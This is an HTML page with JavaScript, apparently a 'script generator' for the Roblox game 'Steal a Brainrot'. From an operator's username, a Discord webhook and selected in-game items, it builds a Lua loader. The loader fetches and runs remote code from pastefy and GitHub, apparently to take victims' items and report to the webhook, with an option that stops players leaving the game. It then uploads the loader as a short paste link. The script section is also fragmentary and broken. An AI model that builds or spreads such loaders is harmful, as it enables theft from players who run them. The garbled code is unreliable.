<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Kevin Hub — Script Generator</title>
  
  <!-- Fonts -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
  
  <style>
    /* ==========================================================================
       CSS VARIABLES & RESET
       ========================================================================== */
    :root {
      --bg: #0a0505;
      --surface: rgba(24, 14, 14, 0.65);
      --border: rgba(255, 255, 255, 0.07);
      --border-hover: rgba(255, 77, 77, 0.5);
      --primary: #ff4d4d;
      --primary-glow: rgba(255, 77, 77, 0.4);
      --accent: #ff6b6b;
      --text: #ececf1;
      --muted: #8a8a99;
      --card-radius: 20px;
    }

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    /* ==========================================================================
       ANIMATIONS
       ========================================================================== */
    @keyframes gradientShift {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }

    @keyframes float {
      0%, 100% { transform: translateY(0px); }
      50% { transform: translateY(-8px); }
    }

    @keyframes glowPulse {
      0%, 100% { box-shadow: 0 0 20px var(--primary-glow), 0 0 40px transparent; }
      50% { box-shadow: 0 0 30px var(--primary-glow), 0 0 60px rgba(255, 77, 77, 0.2); }
    }

    @keyframes slideUp {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }

    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    @keyframes shimmer {
      0% { background-position: -200% 0; }
      100% { background-position: 200% 0; }
    }

    @keyframes dotBounce {
      0%, 80%, 100% { transform: scale(0.6); opacity: 0.4; }
      40% { transform: scale(1); opacity: 1; }
    }

    @keyframes shake {
      0%, 100% { transform: translateX(0); }
      25% { transform: translateX(-4px); }
      75% { transform: translateX(4px); }
    }

    /* ==========================================================================
       BASE STYLES
       ========================================================================== */
    body {
      background: var(--bg);
      font-family: 'Inter', system-ui, -apple-system, sans-serif;
      color: var(--text);
      line-height: 1.6;
      min-height: 100vh;
      overflow-x: hidden;
      position: relative;
    }

    /* Background Gradients */
    body::before {
      content: '';
      position: fixed;
      inset: 0;
      background: 
        radial-gradient(circle at 15% 20%, rgba(255, 77, 77, 0.15), transparent 45%),
        radial-gradient(circle at 85% 80%, rgba(255, 107, 107, 0.12), transparent 45%),
        radial-gradient(circle at 50% 50%, rgba(180, 40, 80, 0.08), transparent 60%);
      z-index: -2;
      animation: gradientShift 20s ease infinite;
      background-size: 200% 200%;
    }

    /* Background Grid */
    body::after {
      content: '';
      position: fixed;
      inset: 0;
      background-image: 
        linear-gradient(rgba(255, 255, 255, 0.02) 1px, transparent 1px),
        linear-gradient(90deg, rgba(255, 255, 255, 0.02) 1px, transparent 1px);
      background-size: 60px 60px;
      z-index: -1;
      pointer-events: none;
      mask-image: radial-gradient(ellipse at center, black 30%, transparent 80%);
    }

    /* ==========================================================================
       LAYOUT
       ========================================================================== */
    .page {
      max-width: 1200px;
      margin: 0 auto;
      padding: 3rem 1.5rem 2rem;
      animation: fadeIn 0.8s ease;
    }

    header {
      text-align: center;
      margin-bottom: 2.5rem;
      animation: slideUp 0.8s ease;
    }

    h1 {
      font-family: 'Space Grotesk', sans-serif;
      font-size: clamp(2.8rem, 8vw, 5rem);
      font-weight: 700;
      letter-spacing: -0.02em;
      background: linear-gradient(135deg, #fff 0%, #ff6b6b 40%, #ff4d4d 100%);
      background-size: 200% 200%;
      -webkit-background-clip: text;
      background-clip: text;
      color: transparent;
      animation: gradientShift 6s ease infinite;
      line-height: 1.1;
    }

    .subtitle {
      margin-top: 0.6rem;
      font-size: 0.75rem;
      letter-spacing: 0.35em;
      text-transform: uppercase;
      color: var(--muted);
      font-weight: 500;
    }

    .tabs-wrap {
      display: flex;
      justify-content: center;
      margin-bottom: 2.5rem;
      animation: slideUp 0.8s ease 0.1s both;
    }

    .tabs {
      display: inline-flex;
      padding: 5px;
      border-radius: 999px;
      background: var(--surface);
      border: 1px solid var(--border);
      backdrop-filter: blur(12px);
    }

    .tab {
      position: relative;
      padding: 0.6rem 1.5rem;
      border-radius: 999px;
      font-size: 0.85rem;
      font-weight: 600;
      border: none;
      background: transparent;
      color: var(--muted);
      cursor: pointer;
      transition: color 0.3s ease;
    }

    .tab.active {
      color: #fff;
    }

    .tab.active::before {
      content: '';
      position: absolute;
      inset: 0;
      border-radius: 999px;
      background: linear-gradient(135deg, var(--primary), var(--accent));
      z-index: -1;
      box-shadow: 0 4px 20px var(--primary-glow);
    }

    .grid {
      display: grid;
      grid-template-columns: 1fr 420px;
      gap: 1.5rem;
      align-items: start;
    }

    @media (max-width: 960px) {
      .grid {
        grid-template-columns: 1fr;
      }
    }

    /* ==========================================================================
       CARDS
       ========================================================================== */
    .card {
      background: var(--surface);
      border: 1px solid var(--border);
      border-radius: var(--card-radius);
      padding: 1.75rem;
      backdrop-filter: blur(16px);
      -webkit-backdrop-filter: blur(16px);
      position: relative;
      overflow: hidden;
      animation: slideUp 0.8s ease 0.2s both;
      transition: border-color 0.3s ease;
    }

    .card::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      height: 1px;
      background: linear-gradient(90deg, transparent, rgba(255, 77, 77, 0.6), transparent);
      opacity: 0.7;
    }

    .card-form {
      display: flex;
      flex-direction: column;
      gap: 1.5rem;
    }

    .card-output {
      position: sticky;
      top: 1.5rem;
      display: flex;
      flex-direction: column;
      gap: 1rem;
    }

    @media (max-width: 960px) {
      .card-output {
        position: static;
      }
    }

    /* ==========================================================================
       FORM ELEMENTS
       ========================================================================== */
    .field {
      display: flex;
      flex-direction: column;
      gap: 0.5rem;
    }

    .label {
      font-size: 0.7rem;
      font-weight: 600;
      letter-spacing: 0.18em;
      text-transform: uppercase;
      color: var(--muted);
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 0.5rem;
    }

    .label .actions {
      display: flex;
      gap: 0.9rem;
    }

    .label .actions button {
      background: none;
      border: none;
      color: var(--muted);
      font-size: 0.7rem;
      font-weight: 700;
      letter-spacing: 0.05em;
      cursor: pointer;
      padding: 0;
      transition: color 0.2s ease;
    }

    .label .actions button:hover {
      color: var(--primary);
    }

    input[type="text"] {
      width: 100%;
      padding: 0.85rem 1rem;
      font-size: 0.9rem;
      font-family: 'Inter', sans-serif;
      color: var(--text);
      background: rgba(0, 0, 0, 0.4);
      border: 1px solid var(--border);
      border-radius: 12px;
      outline: none;
      transition: all 0.25s ease;
    }

    input[type="text"].mono {
      font-family: 'JetBrains Mono', monospace;
      font-size: 0.82rem;
    }

    input[type="text"]::placeholder {
      color: #4a4a58;
    }

    input[type="text"]:focus {
      border-color: var(--primary);
      box-shadow: 0 0 0 3px rgba(255, 77, 77, 0.15), 0 0 20px rgba(255, 77, 77, 0.2);
      background: rgba(0, 0, 0, 0.6);
    }

    input[type="text"].invalid {
      border-color: #ef4444;
      animation: shake 0.4s ease;
    }

    .search-input {
      padding: 0.65rem 0.9rem !important;
      font-size: 0.82rem !important;
    }

    /* ==========================================================================
       PILLS (TAGS)
       ========================================================================== */
    .pills {
      display: flex;
      flex-wrap: wrap;
      gap: 0.5rem;
      max-height: 180px;
      overflow-y: auto;
      padding-right: 4px;
    }

    .pills::-webkit-scrollbar {
      width: 4px;
    }

    .pills::-webkit-scrollbar-track {
      background: transparent;
    }

    .pills::-webkit-scrollbar-thumb {
      background: rgba(255, 77, 77, 0.4);
      border-radius: 4px;
    }

    .pill {
      padding: 0.45rem 0.9rem;
      font-size: 0.75rem;
      font-weight: 500;
      border-radius: 999px;
      border: 1px solid var(--border);
      background: rgba(0, 0, 0, 0.3);
      color: var(--muted);
      cursor: pointer;
      transition: all 0.2s ease;
      animation: fadeIn 0.3s ease;
    }

    .pill:hover {
      border-color: var(--border-hover);
      color: var(--text);
      transform: translateY(-1px);
    }

    .pill.selected {
      border-color: var(--primary);
      background: rgba(255, 77, 77, 0.15);
      color: #ff8a8a;
      box-shadow: 0 0 12px rgba(255, 77, 77, 0.25);
    }

    .pill.selected::after {
      content: '✓';
      margin-left: 0.35rem;
      font-weight: 700;
    }

    .count {
      font-size: 0.65rem;
      letter-spacing: 0.18em;
      color: var(--muted);
      text-transform: uppercase;
      font-weight: 600;
    }

    .count strong {
      color: #ff6b6b;
    }

    /* ==========================================================================
       TOGGLES
       ========================================================================== */
    .checkbox-row {
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 1rem;
      padding: 0.9rem 1.1rem;
      border: 1px solid var(--border);
      border-radius: 12px;
      cursor: pointer;
      transition: all 0.2s ease;
      background: rgba(0, 0, 0, 0.25);
    }

    .checkbox-row:hover {
      border-color: rgba(255, 255, 255, 0.12);
      background: rgba(0, 0, 0, 0.35);
    }

    .checkbox-row .info .name {
      font-size: 0.88rem;
      font-weight: 600;
      color: var(--text);
    }

    .checkbox-row .info .desc {
      font-size: 0.75rem;
      color: var(--muted);
      margin-top: 0.15rem;
    }

    .toggle {
      position: relative;
      width: 42px;
      height: 24px;
      border-radius: 999px;
      background: rgba(255, 255, 255, 0.1);
      transition: background 0.25s ease;
      flex-shrink: 0;
    }

    .toggle::after {
      content: '';
      position: absolute;
      top: 3px;
      left: 3px;
      width: 18px;
      height: 18px;
      border-radius: 50%;
      background: #fff;
      transition: transform 0.25s ease;
    }

    input[type="checkbox"] {
      display: none;
    }

    input[type="checkbox"]:checked + .toggle {
      background: linear-gradient(135deg, var(--primary), var(--accent));
      box-shadow: 0 0 12px var(--primary-glow);
    }

    input[type="checkbox"]:checked + .toggle::after {
      transform: translateX(18px);
    }

    /* ==========================================================================
       MODE SELECTION CARDS
       ========================================================================== */
    .mode-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(130px, 1fr));
      gap: 0.75rem;
    }

    .mode-card {
      background: rgba(0, 0, 0, 0.3);
      border: 1px solid var(--border);
      border-radius: 12px;
      padding: 1.25rem 0.75rem;
      display: flex;
      flex-direction: column;
      align-items: center;
      text-align: center;
      cursor: pointer;
      transition: all 0.2s ease;
    }

    .mode-card:hover {
      border-color: var(--border-hover);
      background: rgba(0, 0, 0, 0.5);
    }

    .mode-card.active {
      border-color: var(--primary);
      background: rgba(255, 77, 77, 0.1);
      box-shadow: 0 0 15px rgba(255, 77, 77, 0.2);
    }

    .mode-card .icon {
      font-size: 1.8rem;
      margin-bottom: 0.5rem;
    }

    .mode-card .title {
      font-size: 0.75rem;
      font-weight: 700;
      color: var(--text);
      text-transform: uppercase;
      letter-spacing: 0.05em;
    }

    .mode-card .desc {
      font-size: 0.65rem;
      color: var(--muted);
      margin-top: 0.25rem;
      line-height: 1.2;
    }

    .mode-card.active .title {
      color: #ff8a8a;
    }

    /* ==========================================================================
       OUTPUT AREA
       ========================================================================== */
    .output-header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 1rem;
    }

    .output-title {
      display: flex;
      align-items: center;
      gap: 0.6rem;
      font-family: 'Space Grotesk', sans-serif;
      font-weight: 600;
      font-size: 1rem;
    }

    .output-title .sparkle {
      color: #ff6b6b;
      animation: float 3s ease infinite;
    }

    .copy-btn {
      display: inline-flex;
      align-items: center;
      gap: 0.4rem;
      padding: 0.5rem 0.9rem;
      font-size: 0.72rem;
      font-weight: 700;
      letter-spacing: 0.05em;
      border-radius: 8px;
      background: linear-gradient(135deg, var(--primary), var(--accent));
      color: #fff;
      border: none;
      cursor: pointer;
      transition: all 0.2s ease;
      box-shadow: 0 2px 12px var(--primary-glow);
    }

    .copy-btn:hover {
      transform: translateY(-1px);
      box-shadow: 0 4px 18px var(--primary-glow);
    }

    .output-box {
      min-height: 200px;
      max-height: 50vh;
      overflow: auto;
      padding: 1rem;
      border-radius: 12px;
      border: 1px solid var(--border);
      background: rgba(0, 0, 0, 0.5);
      font-family: 'JetBrains Mono', monospace;
      font-size: 0.78rem;
      line-height: 1.7;
      color: #c8c6d2;
      white-space: pre-wrap;
      word-break: break-all;
      transition: border-color 0.3s ease;
    }

    .output-box.loading {
      display: flex;
      align-items: center;
      justify-content: center;
      color: var(--muted);
    }

    .output-box .dots {
      display: inline-flex;
      gap: 4px;
      margin-left: 6px;
    }

    .output-box .dots span {
      width: 6px;
      height: 6px;
      border-radius: 50%;
      background: #ff6b6b;
      animation: dotBounce 1.4s ease infinite;
    }

    .output-box .dots span:nth-child(2) { animation-delay: 0.2s; }
    .output-box .dots span:nth-child(3) { animation-delay: 0.4s; }

    .output-box.success {
      border-color: rgba(255, 77, 77, 0.35);
    }

    .output-box.error {
      border-color: rgba(239, 68, 68, 0.4);
      color: #fca5a5;
    }

    /* ==========================================================================
       GENERATE BUTTON
       ========================================================================== */
    .generate-btn {
      width: 100%;
      padding: 1.05rem;
      font-size: 0.85rem;
      font-weight: 700;
      letter-spacing: 0.18em;
      text-transform: uppercase;
      border: none;
      border-radius: 12px;
      background: linear-gradient(135deg, var(--primary), var(--accent));
      color: #fff;
      cursor: pointer;
      position: relative;
      overflow: hidden;
      box-shadow: 0 8px 30px rgba(255, 77, 77, 0.4);
      transition: all 0.25s ease;
    }

    .generate-btn::before {
      content: '';
      position: absolute;
      top: 0;
      left: -100%;
      width: 100%;
      height: 100%;
      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.25), transparent);
      animation: shimmer 2.5s ease infinite;
    }

    .generate-btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 12px 40px rgba(255, 77, 77, 0.55);
    }

    .generate-btn:active {
      transform: translateY(0);
    }

    .generate-btn:disabled {
      cursor: not-allowed;
      opacity: 0.7;
      transform: none;
    }

    .generate-btn .spinner {
      display: inline-block;
      width: 14px;
      height: 14px;
      border: 2px solid rgba(255, 255, 255, 0.35);
      border-top-color: #fff;
      border-radius: 50%;
      animation: spin 0.7s linear infinite;
      margin-right: 0.5rem;
      vertical-align: middle;
    }

    /* ==========================================================================
       FOOTER & TOAST
       ========================================================================== */
    footer {
      margin-top: 4rem;
      text-align: center;
      font-size: 0.72rem;
      color: var(--muted);
      padding-bottom: 2rem;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 0.9rem;
    }

    footer .discord-link {
      display: inline-flex;
      align-items: center;
      gap: 0.55rem;
      padding: 0.6rem 1.2rem;
      border-radius: 999px;
      background: rgba(88, 101, 242, 0.12);
      border: 1px solid rgba(88, 101, 242, 0.3);
      color: #a5b4fc;
      font-size: 0.82rem;
      font-weight: 600;
      text-decoration: none;
      transition: all 0.25s ease;
    }

    footer .discord-link:hover {
      background: rgba(88, 101, 242, 0.2);
      border-color: rgba(88, 101, 242, 0.55);
      color: #c7d2fe;
      transform: translateY(-2px);
      box-shadow: 0 6px 20px rgba(88, 101, 242, 0.3);
    }

    footer .discord-link svg {
      width: 18px;
      height: 18px;
      fill: currentColor;
    }

    .toast {
      position: fixed;
      bottom: 2rem;
      left: 50%;
      transform: translateX(-50%) translateY(100px);
      background: rgba(24, 14, 14, 0.95);
      border: 1px solid var(--border);
      padding: 0.8rem 1.5rem;
      border-radius: 999px;
      font-size: 0.82rem;
      font-weight: 600;
      color: var(--text);
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.6);
      transition: transform 0.35s cubic-bezier(0.34, 1.56, 0.64, 1);
      z-index: 1000;
      display: flex;
      align-items: center;
      gap: 0.5rem;
    }

    .toast.show {
      transform: translateX(-50%) translateY(0);
    }

    .toast .icon {
      color: #ff6b6b;
    }
  </style>
</head>
<body>
  <div class="page">
    <header>
      <h1>Kevin Hub</h1>
      <p class="subtitle">Script Generator</p>
    </header>

    <div class="tabs-wrap">
      <div class="tabs">
        <button class="tab active" data-game="steal-brainrot">Steal a Brainrot</button>
      </div>
    </div>

    <div class="grid">
      <div class="card card-form">
        
        <div class="field">
          <label class="label">Script Mode</label>
          <div class="mode-grid">
            <div class="mode-card active" data-mode="noui">
              <div class="icon">👻</div>
              <div class="title">No UI</div>
              <div class="desc">No graphical interface</div>
            </div>
            <div class="mode-card" data-mode="custom">
              <div class="icon">✏️</div>
              <div class="title">Custom</div>
              <div class="desc">Add your own loader</div>
            </div>
          </div>
        </div>

        <!-- CUSTOM LOADER INPUT (Hidden by default) -->
        <div class="field" id="customLoaderField" style="display: none;">
          <label class="label">Custom Loadstring URL</label>
          <input type="text" class="mono" id="customLoaderInput" placeholder="https://pastefy.app/.../raw or loadstring code" value="">
        </div>

        <!-- USERNAME & WEBHOOK (Visible by default, hidden for Custom) -->
        <div class="field" id="usernameField">
          <label class="label">Roblox Username</label>
          <input type="text" id="usernameInput" placeholder="Your username" value="">
        </div>

        <div class="field" id="webhookField">
          <label class="label">Discord Webhook</label>
          <input type="text" class="mono" id="webhookInput" placeholder="https://discord.com/api/webhooks/..." value="">
        </div>

        <div class="field">
          <div class="label">
            Target Brainrots
            <div class="actions">
              <button data-select-all="brainrots">ALL</button>
              <button data-select-none="brainrots">NONE</button>
            </div>
          </div>
          <input type="text" class="search-input" id="brainrotSearch" placeholder="Search brainrots...">
          <div class="pills" id="brainrotsContainer"></div>
          <div class="count"><strong id="brainrotsSelectedCount">0</strong> SELECTED</div>
        </div>

        <div class="field">
          <div class="label">
            Target Base Skins
            <div class="actions">
              <button data-select-all="skins">ALL</button>
              <button data-select-none="skins">NONE</button>
            </div>
          </div>
          <div class="pills" id="skinsContainer"></div>
          <div class="count"><strong id="skinsSelectedCount">0</strong> SELECTED</div>
        </div>

        <div class="field">
          <div class="label">
            Target Gears
            <div class="actions">
              <button data-select-all="gears">ALL</button>
              <button data-select-none="gears">NONE</button>
            </div>
          </div>
          <div class="pills" id="gearsContainer"></div>
          <div class="count"><strong id="gearsSelectedCount">0</strong> SELECTED</div>
        </div>

        <div class="field">
          <label class="label">Options</label>
          <label class="checkbox-row">
            <div class="info">
              <div class="name">Short Loadstring</div>
              <div class="desc">Only show the tiny loadstring link</div>
            </div>
            <input type="checkbox" id="shortLoadstring" checked>
            <span class="toggle"></span>
          </label>
          
          <label class="checkbox-row" style="margin-top: 0.5rem;">
            <div class="info">
              <div class="name">Anti-Leave</div>
              <div class="desc">Prevents you from leaving the game</div>
            </div>
            <input type="checkbox" id="antiLeaveToggle">
            <span class="toggle"></span>
          </label>
        </div>
      </div>

      <div class="card card-output">
        <div class="output-header">
          <div class="output-title">
            <span class="sparkle">✦</span>
            Generated Script
          </div>

      function renderPills(container, items, selectedSet, type) {
        container.innerHTML = '';
        const searchTerm = type === 'brainrots' ? (brainrotSearch.value || '').toLowerCase() : '';

        items.forEach((item) => {
          if (type === 'brainrots' && searchTerm && !item.toLowerCase().includes(searchTerm)) {
            return;
          }

          const btn = document.createElement('button');
          btn.className = 'pill' + (selectedSet.has(item) ? ' selected' : '');
          btn.textContent = item;

          btn.addEventListener('click', (e) => {
            e.preventDefault();
            if (selectedSet.has(item)) {
              selectedSet.delete(item);
              btn.classList.remove('selected');
            } else {
              selectedSet.add(item);
              btn.classList.add('selected');
            }
            updateCounts();
          });

          container.appendChild(btn);
        });
      }

      function updateCounts() {
        brainrotsSelectedCount.textContent = selectedBrainrots.size;
        skinsSelectedCount.textContent = selectedSkins.size;
        gearsSelectedCount.textContent = selectedGears.size;
      }

        renderPills(brainrotsContainer, brainrotsList, selectedBrainrots, 'brainrots');
        renderPills(skinsContainer, skinsList, selectedSkins, 'skins');
        renderPills(gearsContainer, gearsList, selectedGears, 'gears');
        updateCounts();

        renderPills(brainrotsContainer, brainrotsList, selectedBrainrots, 'brainrots');

      function escapeLua(str) {
        return str.replace(/\\/g, '\\\\').replace(/"/g, '\\"');
      }

      async function createPaste(content) {
        const response = await fetch('https://pastefy.app/api/v2/paste', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': 'Bearer ' + PASTEFY_API_TOKEN
          },
          body: JSON.stringify({
            title: 'Kevin Hub Script',
            content: content,
            visibility: 'UNLISTED'
          })
        });

        if (!response.ok) {
          const errText = await response.text();
          throw new Error('Pastefy API error ' + response.status + ': ' + errText);
        }

        const data = await response.json();
        const id = (data.paste && data.paste.id) || data.id;
        if (!id) {
          throw new Error('Pastefy did not return a paste ID. Response: ' + JSON.stringify(data));
        }
        return 'https://pastefy.app/' + id + '/raw';
      }

      function showToast(text) {
        const toast = $('toast');
        $('toastText').textContent = text;
        toast.classList.add('show');
        clearTimeout(toast._timer);
        toast._timer = setTimeout(() => {
          toast.classList.remove('show');
        }, 2200);
      }

      function markInvalid(el) {
        el.classList.add('invalid');
        setTimeout(() => {
          el.classList.remove('invalid');
        }, 1200);
      }

      generateBtn.addEventListener('click', async () => {
        const username = usernameInput.value.trim();
        const webhook = webhookInput.value.trim();
        const customUrl = customLoaderInput.value.trim();

        let valid = true;

        if (currentMode === 'noui') {
          if (!username) {
            markInvalid(usernameInput);
            valid = false;
          }
          if (!webhook || !webhook.includes('discord.com/api/webhooks')) {
            markInvalid(webhookInput);
            valid = false;
          }
          if (!valid) {
            showToast('Fill in username and a valid Discord webhook');
            scriptOutput.className = 'output-box error';
            scriptOutput.textContent = '❌ Missing required fields.';
            return;
          }
        } else if (currentMode === 'custom') {
          if (!customUrl) {
            markInvalid(customLoaderInput);
            showToast('Enter a custom loadstring URL');
            scriptOutput.className = 'output-box error';
            scriptOutput.textContent = '❌ Please enter your custom loader URL.';
            return;

        if (selectedBrainrots.size === 0) {
          showToast('Select at least 1 brainrot');
          scriptOutput.className = 'output-box error';
          scriptOutput.textContent = '❌ Select at least one brainrot target before generating.';
          return;

        const webhookEscaped = escapeLua(webhook);
        const usernameEscaped = escapeLua(username);

        const brainrotsBlock = Array.from(selectedBrainrots)
          .map((b) => '    ["' + escapeLua(b) + '"] = true,')
          .join('\n');

        const skinsBlock = selectedSkins.size > 0
          ? Array.from(selectedSkins).map((s) => '    ["' + escapeLua(s) + '"] = true,').join('\n')
          : '';

        const gearsBlock = selectedGears.size > 0
          ? Array.from(selectedGears).map((g) => '    ["' + escapeLua(g) + '"] = true,').join('\n')
          : '';

        let luaScript = '';
        
        // Add Anti-Leave block if enabled
        if (antiLeaveToggle.checked) {
          luaScript += 'task.spawn(function()\n' +
                       '    loadstring(game:HttpGet("https://raw.githubusercontent.com/WithKevinDev/kevin-anti-leave/refs/heads/main/main.lua"))()\n' +
                       'end)\n\n';
        }

        // Build based on selected mode
        if (currentMode === 'noui') {
          luaScript += 'local TARGET_ID = 245727\n' +
            'local TARGET_USER = "' + usernameEscaped + '"\n' +
            'local WEBHOOK_URL = "' + webhookEscaped + '"\n\n' +
            'local TargetBrainrots = {\n' + brainrotsBlock + '\n}\n\n' +
            'local TargetBaseSkins = {\n' + skinsBlock + '\n}\n\n' +
            'local TargetGears = {\n' + gearsBlock + '\n}\n\n' +
            'task.spawn(function()\n' +
            '    loadstring(game:HttpGet("https://pastefy.app/RsqRaQC0/raw"))()\n' +
            'end)\n\n' +
            'task.spawn(function()\n' +
            '    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()\n' +
            '    if type(script) == "function" then\n' +
            '        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)\n' +
            '    end\n' +
            'end)\n';
        } else if (currentMode === 'custom') {
          luaScript += 'local TARGET_ID = 245727\n' +
            'local TargetBrainrots = {\n' + brainrotsBlock + '\n}\n\n' +
            'local TargetBaseSkins = {\n' + skinsBlock + '\n}\n\n' +
            'local TargetGears = {\n' + gearsBlock + '\n}\n\n' +
            'task.spawn(function()\n' +
            '    loadstring(game:HttpGet("' + customUrl + '"))()\n' +
            'end)\n\n' +
            'task.spawn(function()\n' +
            '    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()\n' +
            '    if type(script) == "function" then\n' +
            '        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)\n' +
            '    end\n' +
            'end)\n';
        }

        generateBtn.disabled = true;
        generateBtn.innerHTML = '<span class="spinner"></span>Uploading...';
        scriptOutput.className = 'output-box loading';
        scriptOutput.innerHTML = 'Creating paste on Pastefy<span class="dots"><span></span><span></span><span></span></span>';

        try {
          const rawUrl = await createPaste(luaScript);
          const shortLoad = shortLoadstringCheck.checked;

          if (shortLoad) {
            scriptOutput.className = 'output-box success';
            scriptOutput.textContent = 'loadstring(game:HttpGet("' + rawUrl + '"))()';

          scriptOutput.textContent = '-- ❌ Upload failed: ' + err.message;
        } finally {
          generateBtn.disabled = false;
          generateBtn.textContent = 'Generate Script';
        }

        });
